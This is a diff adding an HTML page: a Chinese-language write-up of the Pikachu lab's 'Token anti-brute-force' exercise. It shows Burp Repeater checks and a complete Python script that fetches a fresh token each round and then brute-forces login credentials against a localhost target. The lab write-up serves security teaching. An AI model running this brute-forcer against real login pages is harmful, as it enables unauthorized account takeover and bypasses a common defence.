@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-暴力破解-Token防爆破 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-暴力破解-Token防爆破 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.27 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, 暴力破解, Token绕过, Python自动化</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - 暴力破解 (Burte Force)</li>
+        <li><strong>题目名称：</strong>Token 防爆破？</li>
+        <li><strong>目标：</strong>页面使用一次性 Token 防御 CSRF 和自动化爆破。需要通过脚本实现“动态提取 Token -> 构造请求 -> 提交爆破”的闭环，绕过防爆破机制。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>为了防御爆破，开发者引入了动态 Token（每次提交后服务端验证并销毁，下一次页面刷新会产生新 Token）。但攻击者完全可以在提交请求前，先 GET 获取最新的 Token，再在同一个 Session 中立刻构造 POST 提交。由于脚本的提交速度极快，完全可以在 Token 的有效期内完成爆破。</p>
+
+    <div class="diff-box">
+        <strong>第三关(客户端绕过)与第四关(Token防爆破)的区分判断：</strong>
+        <ul>
+            <li><code>验证码绕过(on client)</code>：抓包发现验证码在前端生成。修改 <code>vcode=111111</code> 重放，服务端依然返回“密码错误”，说明服务端根本没校验（前端校验是纸老虎）。</li>
+            <li><code>Token防爆破?</code>：抓包发现请求体包含 <code>token</code> 参数。在 Repeater 中连续 <code>Send</code> 两次，第二次报错 <code>Token错误</code>（说明服务端执行了一次性校验，用后即焚）。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：抓包与漏洞特征确认</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 抓取登录请求，发现请求体为：<code>username=admin&password=123456&token=538636ab891ef8a82e835845874c&submit=Login</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">结论：</span> 存在一次性动态 Token 防护，Burp Intruder 重放必定失效，需要编写自动化脚本动态刷新 Token。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：Repeater 验证与关键字搜索</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 右键请求 -> <code>Send to Repeater</code>（Ctrl+R）。在 Repeater 界面直接点击 <code>Send</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">寻找回显：</span> 在 Response 下方有一个 <code>Search</code>（搜索）输入框。输入关键字 <code>success</code>，发现右侧渲染页面中命中 <strong>1 match</strong>（匹配 1 处），并在源码第 933 行附近高亮显示了 <code>&lt;p&gt;login success&lt;/p&gt;</code> 字样。这证明 <code>admin/123456</code> 恰好是正确的账号密码！（但是我还是继续了，毕竟不可能每一次都这么好运）</p>
+
+    <div class="step-box">
+        <h3>第三步：编写 Python 动态 Token 爆破脚本</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 使用 <code>requests.Session()</code> 维持会话，利用正则 <code>re.search</code> 在每次请求前提取最新 Token。</p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> requests
+<span class="code-keyword">import</span> re
+<span class="code-keyword">import</span> time
+
+<span class="code-comment"># ================== 配置区域 ==================</span>
+<span class="code-comment"># 目标URL（确认 Pikachu 靶场的实际地址）</span>
+target_url = <span class="code-string">"http://127.0.0.1/pikachu/vul/burteforce/bf_token.php"</span>
+
+<span class="code-comment"># 字典：为了演示循环过程和最终爆破成功的瞬间，将正确密码 '123456' 放在了字典末尾</span>
+users = [<span class="code-string">"admin"</span>, <span class="code-string">"test"</span>, <span class="code-string">"pikachu"</span>, <span class="code-string">"root"</span>]
+passwords = [<span class="code-string">"123"</span>, <span class="code-string">"000000"</span>, <span class="code-string">"abc123"</span>, <span class="code-string">"123456"</span>]
+<span class="code-comment"># ==============================================</span>
+
+<span class="code-comment"># 创建一个 Session 对象，维持整个流程的 Cookie 会话</span>
+<span class="code-comment"># 至关重要：因为 Token 是绑定在服务器端 Session 上的，如果换了个 Cookie，Token 就会失效</span>
+session = requests.Session()
+
+print(<span class="code-string">"[*] 开始全自动动态 Token 爆破..."</span>)
+print(<span class="code-string">"-"</span> * 50)
+
+<span class="code-comment"># 双重循环遍历用户名和密码字典</span>
+<span class="code-keyword">for</span> user <span class="code-keyword">in</span> users:
+    <span class="code-keyword">for</span> pwd <span class="code-keyword">in</span> passwords:
+        <span class="code-keyword">try</span>:
+            <span class="code-comment"># 1. 【关键步】先 GET 请求登录页面，获取当前最新的 Token</span>
+            <span class="code-comment"># 每次重放前必须重新 GET，因为之前的 Token 提交后已经被销毁</span>
+            get_res = session.get(target_url, timeout=5)
+            
+            <span class="code-comment"># 2. 使用正则提取 Token 的值</span>
+            <span class="code-comment"># 匹配规则：找 name="token" 以及紧随其后的 value="..."</span>
+            token_match = re.search(<span class="code-string">r'name="token"\s+value="(.*?)"'</span>, get_res.text)
+            
+            <span class="code-keyword">if</span> <span class="code-keyword">not</span> token_match:
+                print(<span class="code-string">"[!] 无法从页面提取 Token，请检查页面结构或正则表达式！"</span>)
+                exit()
+            
+            current_token = token_match.group(1) <span class="code-comment"># 提取出捕获组里的 Token 字符串</span>
+            
+            <span class="code-comment"># 3. 构造带最新 Token 的 POST 数据</span>
+            data = {
+                <span class="code-string">"username"</span>: user,
+                <span class="code-string">"password"</span>: pwd,
+                <span class="code-string">"token"</span>: current_token,  <span class="code-comment"># 塞入刚刚偷取的新鲜 Token</span>
+                <span class="code-string">"submit"</span>: <span class="code-string">"Login"</span>
+            }
+            
+            <span class="code-comment"># 4. 发送 POST 请求执行爆破（使用同一个 session，确保 Cookie 和 Token 匹配）</span>
+            post_res = session.post(target_url, data=data, timeout=5)
+            
+            <span class="code-comment"># 5. 精准判断请求结果</span>
+            <span class="code-comment"># 注意：不能判断是否包含 "token"，因为失败页面也会重新渲染一个新的 token 字段</span>
+            <span class="code-keyword">if</span> <span class="code-string">"login success"</span> <span class="code-keyword">in</span> post_res.text:
+                print(<span class="code-string">f"\n[+] 爆破成功！账号: {user}  密码: {pwd}\n"</span>)
+                print(<span class="code-string">"[*] 任务完成，脚本退出。"</span>)
+                exit() <span class="code-comment"># 找到密码后立刻退出脚本</span>
+            <span class="code-keyword">elif</span> <span class="code-string">"密码错误"</span> <span class="code-keyword">in</span> post_res.text <span class="code-keyword">or</span> <span class="code-string">"不存在"</span> <span class="code-keyword">in</span> post_res.text:
+                print(<span class="code-string">f"[-] 失败: {user}/{pwd} -> 账号或密码错误，自动进行下一次尝试..."</span>)
+            <span class="code-keyword">else</span>:
+                print(<span class="code-string">f"[-] 失败: {user}/{pwd} -> 未知响应"</span>)
+                
+        <span class="code-keyword">except</span> Exception <span class="code-keyword">as</span> e:
+            print(<span class="code-string">f"[!] 请求发生异常: {e}"</span>)
+        
+        time.sleep(0.2) <span class="code-comment"># 轻微延时，避免请求过快把本地靶场打崩</span>
+
+print(<span class="code-string">"-"</span> * 50)
+print(<span class="code-string">"[*] 字典已跑完，未能爆破出正确密码。"</span>)</code></pre>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：脚本运行结果</h3>
+        <div class="payload-box">
+            <p><strong>终端回显：</strong> 脚本自动获取 Token 并循环执行。前三个密码失败，最终在字典末尾跑出 <code>[+] 爆破成功！账号: admin  密码: 123456</code>。</p>
+        </div>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：Repeater 手工测试的干扰与启发。</strong>在 Repeater 中重放请求时，一开始在 Response 里瞎找，找不到关键信息。后来**利用界面自带的 Search 框直接搜索 <code>success</code>**，快速定位到了成功回显。这也启发了我：在后续脚本中判断成功时，也应该直接提取这个关键字，而不是依赖于 <code>Length</code> 或状态码。</li>
+        <li><strong>坑2：脚本误报“Token校验失败”。</strong>在最初的脚本中，我使用 <code>elif "token" in post_res.text.lower()</code> 作为失败判断。结果当账号密码错误时，脚本也提示“Token失效”。<br>
+        <strong>原因排查：</strong>F12 查看响应源码发现，服务端在密码错误时，会重新渲染登录页面，而**这个页面 HTML 里天然包含了 <code>name="token"</code> 这个表单元素**。导致字符串匹配被误触发。<br>
+        <strong>解决办法：</strong>优化判断逻辑，只提取 <code>login success</code> 作为成功标志，并用“密码错误”等词作为失败判断，彻底避开由于页面结构带来的误报。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>手工验证与自动化利用的边界：</strong>手工测试用于证明“这个漏洞是真实存在的”，而编写脚本则用于证明“这个漏洞在效率上是可以被大规模利用的”。两者缺一不可，这是 WP 深度的重要体现。</li>
+        <li><strong>利用 Burp 搜索功能定位回显：</strong>在 Repeater 或 Intruder 中测试时，不要靠肉眼去翻找返回的 HTML。应该熟练使用 <code>Ctrl+F</code> 或底部的搜索框，精准搜索关键字（如 <code>success</code>、<code>failed</code>、<code>error</code>），这能帮你节省大量时间。</li>
+        <li><strong>动态 Token 并不能完全防爆破：</strong>Token 只能防住“固定的、被动重放”的攻击工具（如入门版 Burp Intruder）。面对具备主动抓取、动态构造能力的 Python 脚本或 Burp 专业版 Macro，这种防御依然会失效。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
